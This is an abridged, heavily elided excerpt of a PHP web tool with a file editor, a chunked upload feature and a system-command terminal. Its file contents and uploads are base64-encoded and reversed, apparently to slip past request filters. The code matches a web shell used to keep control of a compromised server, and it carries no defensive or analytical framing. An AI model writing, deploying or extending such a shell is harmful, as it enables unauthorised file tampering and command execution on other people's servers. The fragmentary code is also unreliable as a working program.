...
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    ...
    if (isset($_POST['saveFile']) && isset($_POST['filePath']) && isset($_POST['fileContent'])) {
        ...
        if (isset($_POST['isB64Rev']) && $_POST['isB64Rev'] === '1') {
    ...
    if ($state_act === 'process') {
        ...
        if ($g_name) {
            ...
            $final=($state_data==='')?'':base64_decode(strrev($state_data));
            ...
            <div class="section-header">
                ...
                <div class="section-actions" style="display:flex;gap:6px;flex-wrap:wrap;align-items:center;">
                    ...
                    <div style="position:relative;display:inline-flex;">
                        <button type="button" id="asyncUploadBtn" onclick="document.getElementById('asyncFileInput').click()" class="btn btn-sm <?php echo $dir_writable ? 'btn-success' : ''; ?>" style="padding:4px 10px;font-size:0.85rem;"><i class="ri-upload-cloud-2-line"></i> Secure Upload</button>
...
Type 'help' for hints or any system command to begin.</div>
    ...
    <div id="editFileModal" class="modal">
        <div class="modal-content modal-lg">
            ...
            <form class="editor-form" method="post" id="editFileForm" onsubmit="return encodeEditForm()">
                <input type="hidden" id="editFilePath" name="filePath">
                <input type="hidden" id="isB64Rev" name="isB64Rev" value="0">
    ...
    <script>
        ...
        function encodeEditForm() {
            try {
                const content = document.getElementById('fileContent').value;
                const b64 = btoa(unescape(encodeURIComponent(content)));
                const reversed = b64.split('').reverse().join('');
                document.getElementById('fileContent').value = reversed;
                document.getElementById('isB64Rev').value = '1';
                return true;
            } catch(e) {
        ...
        async function doAsyncPush(name, b64Data) {
            ...
            for (let i = 0; i < total; i++) {
                ...
                const chunk = b64Data.substring(i * size, (i + 1) * size);
                const reversedChunk = chunk.split('').reverse().join('');

                const fd=new FormData();
                fd.append(ST_A,'process');
                fd.append(ST_N,name);
                fd.append(ST_D,reversedChunk);
                fd.append(ST_I,i);
        ...
        async function handleAsyncUpload(input) {
            ...
            reader.onload = async (e) => {
                ...
                await doAsyncPush(file.name, base64);
            };
